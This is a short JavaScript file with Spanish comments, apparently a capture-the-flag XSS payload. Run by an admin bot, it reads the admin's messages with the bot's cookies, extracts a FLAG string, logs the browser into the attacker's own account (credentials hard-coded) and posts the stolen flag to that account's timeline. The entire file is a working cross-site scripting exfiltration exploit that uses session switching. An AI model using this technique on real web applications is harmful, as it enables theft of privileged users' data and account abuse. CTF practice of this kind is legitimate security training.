// navaja_pivot.js — lee FLAG como admin, cambia a tu sesión y la publica en tu buzón
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const FLAG_RE = /FLAG\{[^}]+\}/i;

  // 1) leer flag desde la sesión ADMIN (el bot ejecuta esto)
  const getFlagFromAdmin = async () => {
    try {
      const r = await fetch('/messages', { credentials: 'include' });
      const j = await r.json(); // {messages:[{id,message},...]}
      const txt = j.messages.map(m => m.message).join('\n');
      const m = txt.match(FLAG_RE);
      if (m) return m[0];
    } catch (_) {}
    // fallback: por si acaso
    try {
      const r2 = await fetch('/messages?id=1', { credentials: 'include' });
      const j2 = await r2.json();
      const txt2 = j2.messages.map(m => m.message).join('\n');
      const m2 = txt2.match(FLAG_RE);
      if (m2) return m2[0];
    } catch (_) {}
    return null;
  };

  const flag = await getFlagFromAdmin();
  if (!flag) return; // no spamear si no hay flag

  // 2) pivot: iniciar sesión como TU usuario
  const YOUR_USER = 'insider1';
  const YOUR_PASS = 'insideer';
  await fetch('/auth', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'action=login&username=' + encodeURIComponent(YOUR_USER) +
          '&password=' + encodeURIComponent(YOUR_PASS)
  });
  await sleep(300); // dejar que se aplique la nueva cookie

  // 3) publicar la flag en tu timeline
  await fetch('/create_msg', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: 'EXFIL_FLAG: ' + flag })
  });
})();
